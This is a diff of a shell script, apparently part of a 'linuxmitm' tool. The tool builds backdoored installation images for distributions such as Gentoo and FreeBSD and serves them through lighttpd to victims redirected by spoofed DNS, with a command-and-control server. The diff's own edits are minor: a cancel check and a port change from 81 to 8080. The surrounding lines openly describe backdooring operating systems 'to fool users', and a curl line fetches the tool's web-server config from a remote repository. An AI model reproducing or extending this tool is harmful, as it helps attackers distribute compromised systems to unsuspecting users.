@@ -12,8 +12,7 @@ EXEC_PORTAGE="emerge -u pip dialog cdrtools squashfs-tools lighttpd"
 EXEC_APT="apt-get install dialog python-pip squashfs-tools genisoimage"
 EXEC_YUM="yum install dialog python-pip squashfs-tools mkisofs cdrtools"
 
-: ${DIALOG_OK=0}
-: ${DIALOG_CANCEL=1}
+
 
 function usage {
     echo "Please specify the client IP and the command and control server"
@@ -222,6 +221,10 @@ dialog --checklist "What operating system distributions would you like to backdo
         12 "Gentoo" off \
         13 "FreeBSD" off 2>"${tmpchecklist}" 
         
+ if [ $? -ge 1 ]; then
+    echo "Bye!"
+ fi
+ 
         selections=`cat $tmpchecklist`
 
  for choice in $selections;
@@ -281,13 +284,13 @@ ls -l out
 # dns response to point to this target machine to fool users
 # if you specify a CNC outside of the compromised box it will work fine.
 curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/lighttpd.conf > lighttpd.conf
-echo "Starting lighttpd web server started on port 81"
+echo "Starting lighttpd web server started on port 8080"
 sed -i "s/PWD/$PWD/" lighttpd.conf
 
 lighttpd -f lighttpd.conf&
 
 if [ $? -ne 0 ]; then
-    popup "Failed to bind 81, check that port isn't in use and try again"
+    popup "Failed to bind 8080, check that port isn't in use and try again"
     exit 1
 fi
 
